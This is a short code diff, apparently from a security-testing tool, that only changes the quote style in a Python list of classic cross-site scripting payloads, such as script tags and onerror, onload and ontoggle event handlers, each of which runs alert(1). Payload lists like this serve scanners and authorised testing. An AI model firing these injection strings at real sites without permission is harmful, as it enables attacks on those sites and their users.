@@ -2,15 +2,15 @@
 
 # Classic reflected/stored XSS payloads
 BASIC: list[str] = [
-    '<script>alert(1)</script>',
-    '<img src=x onerror=alert(1)>',
-    '<svg onload=alert(1)>',
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
     '"><script>alert(1)</script>',
     "'-alert(1)-'",
-    '<body onload=alert(1)>',
-    '<input onfocus=alert(1) autofocus>',
-    '<details open ontoggle=alert(1)>',
-    '<marquee onstart=alert(1)>',
+    "<body onload=alert(1)>",
+    "<input onfocus=alert(1) autofocus>",
+    "<details open ontoggle=alert(1)>",
+    "<marquee onstart=alert(1)>",
 ]
 
 # Polyglot payloads that work across multiple contexts
